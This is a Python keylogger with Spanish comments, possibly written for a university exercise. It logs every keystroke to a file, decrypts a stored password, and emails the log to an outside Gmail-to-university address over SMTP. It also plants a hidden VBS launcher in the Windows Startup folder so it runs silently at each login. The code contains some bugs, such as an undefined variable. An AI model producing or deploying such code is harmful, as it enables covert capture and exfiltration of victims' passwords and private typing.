#!/usr/bin/python

# importamos las librerias de tiempo
import datetime
import time

# importamos pynput que nos grabara las teclas
from pynput.keyboard import Listener

# Importamos la libreria criptografica Fernet
from cryptography.fernet import Fernet

# Importamos las librerias para enviar email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib

# importamos las librerias para trabajar con el Sistema Operativo
import getpass
import os


def key_listener():
    # d = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    fichero = 'keylogger_{}.txt'

    f = open(fichero, 'a')

    t0 = time.time()
    t1 = time.time()

    def key_recorder(key):

        if time.time() - t1 > 5:
            f.write('\n')

        key = str(key)
        if key == 'Key.enter':
            f.write('\n')
        elif key == 'Key.space':
            f.write(key.replace('Key.space', ' '))
        elif key == 'Key.backspace':
            f.write(key.replace("Key.backspace", "%BORRAR%"))
        elif key == '<65027>':
            f.write('%ARROBA%')
        else:
            f.write(key.replace("'", ""))

        if time.time() - t0 > 60:
            f.close()
            enviar_email(file_name)

    with Listener(on_press=key_recorder) as listener:
        listener.join()


def enviar_email(nombre):
    def cargar_key():
        return open('pass.key', 'rb').read()

    key = cargar_key()

    clave = Fernet(key)
    pass_enc = (open('pass.enc', 'rb').read())
    password = clave.decrypt(pass_enc).decode()

    msg = MIMEMultipart()
    mensaje = 'Para revisar'

    msg['From'] = 'key.prueba.logger@gmail.com'
    msg['To'] = 'amartinlah@uoc.edu'
    msg['Subject'] = 'El mensaje de cada 2 horas'

    msg.attach(MIMEText(mensaje, 'plain'))

    attachment = open(nombre, 'r')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    p.add_header('Content-Disposition', "attachment; filename= %s" % str(nombre))
    msg.attach(p)

    server = smtplib.SMTP('smtp.gmail.com: 587')
    server.starttls()
    server.login(msg['From'], password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()


def mover_fichero():
    user_name = getpass.getuser()
    final_path = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(user_name)
    path_script = os.path.dirname(os.path.abspath(__file__))

    with open('open.bat', 'w+') as bat_file:
        bat_file.write('cd "{}"\n'.format(path_script))
        bat_file.write('python "keylogger.py"')

    with open(final_path + '\\' + "open.vbs", "w+") as vbs_file:
        vbs_file.write('Dim WinScriptHost\n')
        vbs_file.write('Set WinScriptHost = CreateObject("WScript.Shell")\n')
        vbs_file.write('WinScriptHost.Run Chr(34) & "{}\open.bat" & Chr(34), 0\n'.format(path_script))
        vbs_file.write('Set WinScripthost = Nothing\n')


if __name__ == '__main__':
    mover_fichero()
    key_listener()
